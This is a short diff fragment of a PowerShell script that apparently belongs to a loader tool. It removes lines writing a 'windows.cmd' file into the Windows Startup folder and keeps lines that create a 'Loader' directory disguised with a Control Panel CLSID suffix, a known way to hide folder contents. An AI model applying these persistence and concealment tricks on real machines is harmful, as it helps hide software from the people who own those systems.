@@ -34,8 +34,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     }
 }
 
-$filePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\windows.cmd"
-Set-Content -Path $filePath -Value "exit"
 
 $rdir = "C:\Users\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
